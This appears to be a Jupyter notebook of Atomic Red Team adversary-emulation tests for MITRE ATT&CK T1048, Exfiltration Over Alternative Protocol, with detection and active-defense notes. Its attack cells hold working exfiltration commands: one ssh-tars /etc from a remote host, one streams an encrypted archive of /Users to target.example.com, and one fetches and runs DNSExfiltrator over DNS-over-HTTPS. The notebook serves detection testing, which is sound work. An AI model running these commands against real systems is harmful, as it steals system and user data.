{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "21455861",
   "metadata": {},
   "source": "# T1048 - Exfiltration Over Alternative Protocol\nAdversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)\n\nMany IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009)."
  },
  {
   "cell_type": "markdown",
   "id": "f9deca1b",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "6f89bafa",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Exfiltration Over Alternative Protocol - SSH",
    "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.\n",
    "**Supported Platforms:** macos, linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nssh target.example.com \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a14f6e8d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1048 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "23f1aae3",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Exfiltration Over Alternative Protocol - SSH",
    "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.\n",
    "**Supported Platforms:** macos, linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ntar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "92e447c6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1048 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "9a67f896",
   "metadata": {},
   "source": "### Atomic Test #3 - DNSExfiltration (doh)\nDNSExfiltrator allows for transferring (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: DNSExfiltrator powershell file must exist on disk at specified location (#{ps_module})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIWR \"https://raw.githubusercontent.com/Arno0x/DNSExfiltrator/8faa972408b0384416fffd5b4d42a7aa00526ca8/Invoke-DNSExfiltrator.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e4f98b8b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1048 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "fa5f9778",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1\"\nInvoke-DNSExfiltrator -i \"PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1\" -d target.example.com -p atomic -doh google -t 500 None\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aebe36c5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1048 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "1dcaa7a8",
   "metadata": {},
   "source": "## Detection\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)"
  },
  {
   "cell_type": "markdown",
   "id": "6ce6460f",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Network Manipulation \n Make changes to network properties and functions to achieve a desired effect. \n\n Network Manipulation allows a defender to throttle network speeds, segment the network, maintain a unique IP addressing scheme, or add a kill switch to cut off network access if needed.\n#### Opportunity\nThere is an opportunity to disrupt or enable and adversary's exfiltration activities by blocking/unblocking the traffic to their Command and Control (C2) location.\n#### Use Case\nA defender can prevent or enable use of alternate protocols for exfiltration by blocking/unblocking unnecessary ports and protocols.\n#### Procedures\nAdd a kill switch to a decoy network that can be used to shutdown all network communication if an adversary takes an action that is out of the desired scope.\nIntroduce intermittent network packet loss on a decoy network to interfere with an adversary's activities.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}